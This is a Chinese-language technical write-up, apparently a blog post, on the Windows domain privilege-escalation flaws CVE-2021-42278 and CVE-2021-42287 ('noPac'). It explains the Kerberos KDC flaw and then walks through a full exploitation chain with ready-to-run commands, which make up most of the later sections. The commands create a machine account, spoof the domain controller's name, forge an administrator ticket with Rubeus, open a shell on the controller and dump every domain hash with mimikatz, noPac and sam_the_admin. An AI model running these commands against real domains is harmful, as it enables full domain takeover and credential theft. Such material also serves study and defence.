## 漏洞背景

2021年11月9日，微软发布11月份安全补丁更新。在该安全补丁更新中，修复了两个域内权限提升漏洞CVE-2021-42287
、CVE-2021-42278。当时这两个漏洞的利用详情和POC并未公布，因此并未受到太多人关注。

一个月后，国外安全研究员公布了
CVE-2021-42278和CVE-2021-42287的漏洞细节，并且exp也很快被公布。至此，这个最新的域内权限提升漏洞才受到大家的广泛关注，该漏洞被命名为saMAccountName
spoofing 漏洞。该漏洞允许攻击者在仅有⼀个普通域账号的场景下，利⽤该漏洞接管全域，危害极⼤。

 **注意** ：受漏洞影响的版本是未打补丁的全版本Windows域控

## 漏洞原理

### 1、漏洞核心点

⾸先，通过查看了下⽹上泄露的XP源代码，找到了漏洞问题的所在。

如图所示，通过查看源代码中关于kerberos的处理流程的内容，我们可以清楚的看到漏洞产生的核心原因是在处理Username字段时的错误，如果第一次查找不到Username，KDC会继续查找
Username$。

![图片.png](https://image.3001.net/images/20230601/1685550290_647774d23fcf1c04703e2.png!small)

如果第二次还是查找不到，KDC会继续查找altSecurityIdentities属性为对应值的用户，如图所示：

![图片.png](https://image.3001.net/images/20230601/1685550304_647774e0a9f76f6a9f1ea.png!small)

正是因为这个处理逻辑，导致了漏洞的产⽣！但是光有这个处理逻辑还是不够形成⼀个完整的攻  
击链。还得找到这个漏洞的触发点。那么如何能让KDC找不到之前的用户呢?

  * 跨域请求：跨域请求时，⽬标域活动⽬录数据库是找不到其他域的⽤户的，因此会⾛进这个 处理UserName的逻辑。

  * 修改saMAccountName属性：在当前域，可以通过修改saMAccountName属性让KDC找不  
到⽤户，然后⾛进这个处理UserName的逻辑。

以上仅仅是KDC⾛进这个处理UserName的逻辑，还不能伪造⾼权限。因为票据中代表⽤户身份权限是数据块是PAC。而TGT中的PAC是根据预认证身份信息生成的，无法伪造，因此得想办法在ST中进行伪造。正常的ST中的PAC是直接复制TGT中的，得想办法让KDC在TGS-REP阶段重新生成PAC，而不是复制TGT中的PAC。这里有如下两种方式：

  * S4U2Self请求：KDC在处理S4U2Self类型的TGS-REQ请求时，PAC是重新⽣成的。

  * 跨域⽆PAC的TGT票据进⾏TGS请求：KDC在处理跨域的TGS-REQ请求时，如果携带的TGT  
认购权证中没有PAC，PAC会重新⽣成。

### 2、S4u2Self 请求PAC的生成

如图所示：可以得知KDC收到客户端发来的TGS-REQ S4u2Self
，在验证了客户端是否具有发起S4U2Self协议权限后，会根据S4U2Self协议中模拟的⽤户⽣成对应权限的PAC，然后放在ST中，并不会复用TGT中的PAC！

![图片.png](https://image.3001.net/images/20230601/1685550322_647774f26701ad5053320.png!small)

### 3、跨域无PAC的TGS请求生成

如图所示，可以得知如果请求得TGT中没有PAC，且是当前域得请求，则ST服务票据也没有PAC，如果是其他域，则会重新生成一个PAC。

![图片.png](https://image.3001.net/images/20230601/1685550336_647775004590c484819be.png!small)

### 4、原理总结

这个漏洞的产生核心的原因是KDC在处理UserName字段时的问题，而后结合两种攻击链针对域内和跨域进行攻击。

  * 当针对域内攻击时，结合了CVE-2021-42278漏洞来修改机器⽤户的saMAccountName属  
性，让KDC找不到⽤户，⾛进处理UserName的逻辑。 然后再利⽤KDC在处理S4U2Self时的  
逻辑问题(不校验发起S4U2Self请求的⽤户是否具有权限发起S4U2Self请求)以及重新⽣成PAC的这⼀特性来进⾏攻击。

  * 当针对跨域攻击时，其实意义不⼤。因为需要修改其他域内⾼权限⽤户的altSecurityIdentities属性，⽽默认是没有权限修改的，只有根域管理员或者其他域的域管理员才有权限修改。当跨域TGS请求时，⽬标域控在活动⽬录数据库内是找不到其他域的⽤户的，因此⾛进处理UserName的逻辑。然后再利⽤跨域TGS-REQ请求时的处理逻辑(如果TGT票据中没有PAC，则重新⽣成)这⼀特性来进⾏攻击的。

综上所述，这个漏洞针对跨域攻击的实战意义不大，针对域内攻击更有效，如图所示是针对域内攻击链的逻辑处理图：

![图片.png](https://image.3001.net/images/20230601/1685550352_64777510e4875e5108947.png!small)

## 漏洞利用流程

针对漏洞的成功利用仅需要一个有效的普通域用户账户即可，漏洞流程图如图所示：

![图片.png](https://image.3001.net/images/20230601/1685550372_64777524735661b3a5d75.png!small)

流程图如下：

1）利⽤SAMR协议创建⽆SPN的机器账⼾machine$  
2）修改机器账⼾machine$的saMAccountName属性为DC  
3）以DC账⼾请求TGT  
4）将机器账⼾machine$的saMAccountName属性还原为machine$  
5)利⽤S4u2Self协议以域管理员⾝份请求域控DC的服务，在请求中带上上⼀步的TGT。KDC⾸先会查询DC，发现没有该账⼾，然后会查询DC$,查询到了是域控，允许域控发起S4u2Self请求⾃⾝的服务。因此返回域管理员权限访问域服务的ST。  
6）⽤⾼权限票据执⾏⾼权限的操作。

### 1、创建机器账户

首先，我们可以使用一个有效的域用户创建一个域内机器账户。默认情况下，域内普通用户最多能创建10个机器账户，创建机器账户的数量由域的ms-MachineAccountQuota属性决定，该属性的值默认为10。

（1）Impacket脚本创建

使用addcomputer.py脚本运行如下的命令利用SAMR协议远程新建一个域内机器账户machine$,密码为root。

    
    
    python3 addcomputer.py -computer-name 'machine' -computer-pass 'root' -dc-ip 192.168.41.10 'hack.com/hack:Admin123' -method SAMR -debug
    

![图片.png](https://image.3001.net/images/20230601/1685550393_647775396f5aaa4e77741.png!small)

通过这种创建的机器账户没有SPN，如图所示

![图片.png](https://image.3001.net/images/20230601/1685550406_647775467a434e4d6e20b.png!small)

（2）Powershell脚本创建

脚本下载地址：`https://github.com/Kevin-Robertson/Powermad`

使用PowerShell脚本在域内机器上运行如下的命令创建一个机器账户machine2$,密码为root

    
    
    Import-Module .\Powermad.ps1
    New-MachineAccount -MachineAccount machine2
    

![图片.png](https://image.3001.net/images/20230601/1685550422_6477755686cc740404213.png!small)

通过这种方式创建的机器账户有SPN，如图所示：

![图片.png](https://image.3001.net/images/20230601/1685550436_6477756427b8488e33601.png!small)

（3）清除机器账户的SPN

如果是通过addcomputer.py脚本创建的机器账户，则无需清除SPN；如果是通过Powershell脚本创建的机器账户，则需要清除SPN

在创建的机器账户machine2$上执行如下的命令清除SPN。

    
    
    Import-Module .\powerview.ps1
    Set-DomainObject "CN=machine2,CN=Computers,DC=hack,DC=com" -Clear 'serviceprincipalname' -Verbose
    

或者也可以使用addspn.py脚本执行如下的命令远程清除，只需要提供一个有权限的SPN账户即可。

脚本下载地址：`https://github.com/dirkjanm/krbrelayx/`

    
    
    #查询机器账户machine2$的SPN
    python3 addspn.py -u 'hack.com\hack' -p Admin123 -t 'machine2$' -q 192.168.41.10
    #清除机器账户machine2$的SPN
    python3 addspn.py -u 'hack.com\hack' -p Admin123 -t 'machine2$' -c 192.168.41.10
    

![图片.png](https://image.3001.net/images/20230601/1685550467_64777583239d39d828906.png!small)

![图片.png](https://image.3001.net/images/20230601/1685550474_6477758aa98ba99164a93.png!small)

为什么要清除SPN呢？因为如果不清除该机器账户的SPN，当修改该机器账户的saMAccountName
属性为DC时，此时该机器账户的SPN也会随之改变成对应的值。而域控已经有了该SPN了，同一域中SPN是单独且唯一的。因此不清除SPN修改该机器账户的saMAccountName
属性为DC时，会提示该服务器不愿意处理该请求从而失败。

### 2、修改机器账户的saMAccountName 属性为域控

在创建机器账户machine2$的机器上执行如下的命令，修改机器账户machine2$的saMAccountName属性为域控机器名。

    
    
    Import-Module .\Powermad.ps1
    #查询机器账户的machine2$的saMAccountName 属性
    Get-MachineAccountAttribute -MachineAccount machine2 -Attribute saMAccountName
    #修改器账户的machine2$的saMAccountName 属性为DC
     Set-MachineAccountAttribute -MachineAccount machine2 -Value "DC" -Attribute saMAccountName -Verbose
    

![图片.png](https://image.3001.net/images/20230601/1685550490_6477759a9c57bd31dad90.png!small)

### 3、请求TGT

通过Rubeus.exe运行如下的命令请求TGT

    
    
    Rubeus.exe asktgt /user:"DC" /password:"root" /domain:"hack.com" /dc:"DC.hack.com" /nowrap /ptt
    

![图片.png](https://image.3001.net/images/20230601/1685550507_647775ab2b968515fe417.png!small)

### 4、修改机器账户的saMAccountName属性为非域控

将机器账户machine2$的saMAccountName属性修改为非域控，执行如下的命令，如图所示：

    
    
    Import-Module .\Powermad.ps1
    #查询机器账户的machine2$的saMAccountName 属性
    Get-MachineAccountAttribute -MachineAccount machine2 -Attribute saMAccountName
    #机器账户的machine2$的saMAccountName 属性修改为machine2$
    Set-MachineAccountAttribute -MachineAccount machine2 -Value "machine2$" -Attribute saMAccountName -Verbose
    

![图片.png](https://image.3001.net/images/20230601/1685550519_647775b7e5ae9ff16f2e9.png!small)

### 5、请求高权限的ST

运行如下的命令发起S4u2Self协议请求以administrator身份访问ldap/DC.hack.com的ST，并导入内存。

    
    
    Rubeus.exe s4u /self /impersonateuser:"administrator" /altservice:"ldap/DC.hack.com" /dc:"DC.hack.com" /ptt /ticket:上一步请求的TGT的base64格式
    

![图片.png](https://image.3001.net/images/20230601/1685550535_647775c729493f4633326.png!small)

### 6、导出域内用户的Hash

使用mimikatz运行如下的命令即可导出域内任意用户的Hash。

    
    
    #导出用户Krbtgt的Hash
    mimikatz.exe "lsadump::dcsync /domain:hack.com /user:krbtgt /csv" "exit"
    

![图片.png](https://image.3001.net/images/20230601/1685550550_647775d633b997cdc69a1.png!small)

## 漏洞复现

这里使用几种不同的工具进行漏洞复现。

实验环境如下：

  * 域控DC:192.168.41.10

  * 域有效用户：hack\hack, Admin123

### 1、noPac.exe

运行如下的命令使用noPac.exe对目标域进行漏洞利用。

工具下载地址：`https://github.com/cube0x0/noPac`

    
    
    noPac.exe -domain hack.com -user hack -pass Admin123 /dc DC.hack.com /mAccount machine /mPassword root /service cifs /ptt
    

如图所示运行完成后生成票据并导入内存中

![图片.png](https://image.3001.net/images/20230601/1685550564_647775e4d854370e6c028.png!small)

然后直接使用mimikatz即可导出域内任意用户的Hash，如图所示：

    
    
    mimikatz.exe "lsadump::dcsync /domain:hack.com /user:krbtgt /csv" "exit"
    

![图片.png](https://image.3001.net/images/20230601/1685550588_647775fc87c7f4da190d3.png!small)

### 2、sam_the_admin

脚本下载地址：`https://github.com/WazeHell/sam-the-admin`

（1）获得域控权限

该工具获得域控权限的命令如下，如图所示，获得了域控DC的权限。

    
    
    python3 sam_the_admin.py "hack/hack:Admin123" -dc-ip 192.168.41.10 -shell
    

![图片.png](https://image.3001.net/images/20230601/1685550604_6477760cbfa70e091e1a8.png!small)

（2）导出域内Hash

该工具导出域内Hash的命令如下，如图所示，导出了域内所有的Hash。

    
    
    python3 sam_the_admin.py "hack/hack:Admin123" -dc-ip 192.168.41.10 -dump
    

![图片.png](https://image.3001.net/images/20230601/1685550626_64777622a455fce1da8ac.png!small)

### 3、noPac.py

脚本下载地址：`https://github.com/Ridter/noPac`

检测目标是否存在漏洞

    
    
    python3 scanner.py -use-ldap hack.com/hack:"Admin123" -dc-ip 192.168.41.10
    

![图片.png](https://image.3001.net/images/20230601/1685550643_647776334e9cd3a4d3da9.png!small)

获取目标域控的shell

    
    
    python3 noPac.py -use-ldap hack.com/hack:"Admin123" -dc-ip 192.168.41.10 -shell --impersonate administrator
    

![图片.png](https://image.3001.net/images/20230601/1685550658_64777642f342ec556b96e.png!small)

获取目标域控所有账户的Hash值

    
    
    python3 noPac.py -use-ldap hack.com/hack:"Admin123" -dc-ip 192.168.41.10 --impersonate administrator -dump
    

![图片.png](https://image.3001.net/images/20230601/1685550674_64777652855bebbac698e.png!small)

